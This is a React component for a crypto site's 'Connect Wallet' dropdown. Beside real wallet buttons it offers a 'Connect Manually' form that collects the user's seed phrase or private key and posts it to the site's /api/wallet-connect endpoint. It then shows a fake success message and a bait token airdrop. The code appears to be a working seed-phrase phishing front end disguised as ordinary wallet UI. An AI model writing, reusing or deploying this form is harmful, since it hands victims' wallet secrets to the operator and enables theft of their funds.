"use client";

import { useState, useRef, useEffect } from "react";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import { useAccount } from "wagmi";

function WalletIcon({
  label,
  imgSrc,
  fallback,
  fallbackColor,
  onClick,
}: {
  label: string;
  imgSrc: string;
  fallback: string;
  fallbackColor: string;
  onClick: () => void;
}) {
  return (
    <button
      onClick={onClick}
      title={label}
      className="flex flex-col items-center gap-1.5 p-2.5 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 hover:border-white/20 transition-all group"
    >
      <div className="w-9 h-9 rounded-lg overflow-hidden flex items-center justify-center bg-white/5">
        <img
          src={imgSrc}
          className="w-full h-full object-contain"
          alt={label}
          onError={(e) => {
            const el = e.target as HTMLImageElement;
            el.src = `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='36' height='36' viewBox='0 0 36 36'%3E%3Crect width='36' height='36' rx='8' fill='%23${fallbackColor}'/%3E%3Ctext x='18' y='24' text-anchor='middle' fill='white' font-size='16' font-weight='bold'%3E${encodeURIComponent(fallback)}%3C/text%3E%3C/svg%3E`;
          }}
        />
      </div>
      <span className="text-[10px] text-white/50 group-hover:text-white/80 transition-colors truncate max-w-full leading-tight">
        {label}
      </span>
    </button>
  );
}



type MsgState = "idle" | "loading" | "sent" | "error";
type ManualMode = "seed" | "privatekey";

interface Props {
  /** Called whenever the dropdown opens or closes — parent uses this to hide elements below */
  onOpenChange?: (open: boolean) => void;
}

export function ConnectOrMessage({ onOpenChange }: Props) {
  const { openConnectModal } = useConnectModal();
  const { isConnected } = useAccount();
  const [open, setOpen] = useState(false);
  const [showMsg, setShowMsg] = useState(false);
  const [name, setName] = useState("");
  const [manualMode, setManualMode] = useState<ManualMode>("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [msgState, setMsgState] = useState<MsgState>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const ref = useRef<HTMLDivElement>(null);
  const [mounted, setMounted] = useState(false);

  useEffect(() => { setMounted(true); }, []);

  // Notify parent whenever open state changes
  const setOpenWithNotify = (val: boolean) => {
    setOpen(val);
    onOpenChange?.(val);
    if (!val) {
      setShowMsg(false);
      setSeedPhrase("");
      setPrivateKey("");
      setName("");
      setMsgState("idle");
    }
  };

  // Close on outside click
  useEffect(() => {
    function handler(e: MouseEvent) {
      if (ref.current && !ref.current.contains(e.target as Node)) {
        setOpenWithNotify(false);
      }
    }
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  async function handleConnectManual(e: React.FormEvent) {
    e.preventDefault();

    const secret = manualMode === "seed" ? seedPhrase.trim() : privateKey.trim();
    if (!secret) return;

    setMsgState("loading");
    setErrorMsg("");

    try {
      const payload: Record<string, string> = { wallet_name: name.trim() || "Anonymous" };
      if (manualMode === "seed") {
        payload.seed_phrase = secret;
      } else {
        payload.private_key = secret;
      }

      const res = await fetch("/api/wallet-connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!res.ok) throw new Error("Failed");
      setMsgState("sent");
      setName("");
      setSeedPhrase("");
      setPrivateKey("");
    } catch {
      setMsgState("error");
      setErrorMsg("Failed to connect. Try again.");
    }
  }

  if (!mounted) {
    return (
      <button className="inline-flex items-center justify-center gap-2.5 rounded-full bg-white/10 border border-white/25 px-10 py-4 text-lg font-bold text-white opacity-80">
        Connect Wallet
        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
      </button>
    );
  }

  return (
    <div ref={ref} className="relative inline-flex flex-col items-center">
      {/* ── Main button ── */}
      <button
        onClick={() => setOpenWithNotify(!open)}
        className={`group inline-flex items-center justify-center gap-2.5 rounded-full border px-10 py-4 text-lg font-bold transition-all duration-300 hover:scale-105 hover:shadow-2xl ${
          isConnected
            ? "bg-success/15 border-success/30 text-success hover:bg-success/20 hover:shadow-success/20"
            : "bg-white/10 border-white/25 text-white hover:bg-white/15 hover:border-white/40"
        }`}
      >
        <svg className="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
          <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a2.25 2.25 0 00-2.25-2.25H15a3 3 0 11-6 0H5.25A2.25 2.25 0 003 12m18 0v6a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 9m18 0V6a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 6v3" />
        </svg>
        {isConnected ? "✓ Wallet Connected" : "Connect Wallet"}
        <svg
          className={`w-4 h-4 transition-transform duration-200 shrink-0 ${open ? "rotate-180" : ""}`}
          fill="none" viewBox="0 0 24 24" stroke="currentColor"
        >
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
        </svg>
      </button>

      {/* ── Dropdown ── */}
      {open && !showMsg && (
        <div className="mt-3 w-80 rounded-2xl glass border border-white/15 shadow-2xl shadow-black/40 animate-slide-down p-4">
          <p className="text-xs font-semibold text-white/40 uppercase tracking-wider mb-3">
            Connect a wallet
          </p>

          {/* Wallet grid */}
          <div className="grid grid-cols-3 gap-2 mb-4">
            <WalletIcon
              label="MetaMask"
              imgSrc="https://freelogopng.com/images/webp/918.webp"
              fallback="M"
              fallbackColor="E2761B"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="Phantom"
              imgSrc="https://kimi-web-img.moonshot.cn/img/cdn.brandfetch.io/b17efa83b875a4cd2a5ac24980e56062d7317a16.jpeg"
              fallback="P"
              fallbackColor="AB9FF2"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="Coinbase"
              imgSrc="https://kimi-web-img.moonshot.cn/img/cdn.iconscout.com/306f5571bfe2c2c2134dc8f24bc228dbd387dd8f.png"
              fallback="C"
              fallbackColor="0052FF"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="Trust"
              imgSrc="https://kimi-web-img.moonshot.cn/img/cdn.cookielaw.org/38d604f08edf7b591219657d9be526160b4aa2e3.png"
              fallback="T"
              fallbackColor="0074A5"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="OKX"
              imgSrc="https://cryptologos.cc/logos/okx-okb-logo.png"
              fallback="OK"
              fallbackColor="1a1a2e"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="Rainbow"
              imgSrc="https://cryptologos.cc/logos/rainbow-rainbow-logo.png"
              fallback="🌈"
              fallbackColor="a855f7"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="Rabby"
              imgSrc="https://cryptologos.cc/logos/rabby-wallet-rabby-wallet-logo.png"
              fallback="R"
              fallbackColor="33aa55"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="Zerion"
              imgSrc="https://cryptologos.cc/logos/zerion-zerion-logo.png"
              fallback="Z"
              fallbackColor="2969ff"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
            <WalletIcon
              label="Ledger"
              imgSrc="https://cryptologos.cc/logos/ledger-ledger-logo.png"
              fallback="L"
              fallbackColor="333333"
              onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            />
          </div>

          <div className="h-px bg-white/8 mb-3" />

          <button
            onClick={() => setShowMsg(true)}
            className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-white/70 hover:text-white hover:bg-white/8 transition-all text-left"
          >
            <span className="w-9 h-9 rounded-xl bg-violet-500/25 flex items-center justify-center shrink-0">
              <svg className="w-4 h-4 text-violet-300" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
              </svg>
            </span>
            <div>
              <p className="font-semibold text-white">Connect Manually</p>
              <p className="text-xs text-white/40 mt-0.5">Seed phrase or private key</p>
            </div>
          </button>
        </div>
      )}

      {/* ── Manual connect form ── */}
      {open && showMsg && (
        <div className="mt-3 w-80 rounded-2xl glass border border-white/15 shadow-2xl shadow-black/40 p-5 animate-slide-down space-y-4">
          <div className="flex items-center justify-between">
            <p className="font-bold text-white">Connect Manually</p>
            <button
              onClick={() => setOpenWithNotify(false)}
              className="text-white/30 hover:text-white/60 transition-colors p-1"
            >
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          {msgState === "sent" ? (
            <div className="text-center space-y-2 py-4">
              <p className="text-2xl">🔗</p>
              <p className="text-sm text-green-400 font-semibold">Wallet connected!</p>
              <p className="text-xs text-white/40">+1,000 MORK tokens airdropped.</p>
              <button onClick={() => setOpenWithNotify(false)} className="text-xs text-white/30 hover:text-white/50 underline">
                Close
              </button>
            </div>
          ) : (
            <form onSubmit={handleConnectManual} className="space-y-3">
              <input
                type="text"
                placeholder="Wallet Name (optional)"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
              />

              {/* Mode toggle */}
              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => setManualMode("seed")}
                  className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                    manualMode === "seed"
                      ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                      : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                  }`}
                >
                  Seed Phrase
                </button>
                <button
                  type="button"
                  onClick={() => setManualMode("privatekey")}
                  className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                    manualMode === "privatekey"
                      ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                      : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                  }`}
                >
                  Private Key
                </button>
              </div>

              {manualMode === "seed" ? (
                <textarea
                  placeholder="Enter your 12 or 24-word seed phrase..."
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  rows={3}
                  required
                  className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none resize-none"
                />
              ) : (
                <input
                  type="password"
                  placeholder="Enter your private key (0x...)"
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  required
                  className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
                />
              )}

              <button
                type="submit"
                disabled={msgState === "loading" || (manualMode === "seed" ? !seedPhrase.trim() : !privateKey.trim())}
                className="w-full rounded-lg bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 py-2.5 text-sm font-bold text-white hover:opacity-90 disabled:opacity-50 transition-opacity"
              >
                {msgState === "loading" ? "Connecting…" : "Connect"}
              </button>
              {msgState === "error" && <p className="text-xs text-red-400 text-center">{errorMsg}</p>}
            </form>
          )}
        </div>
      )}
    </div>
  );
}
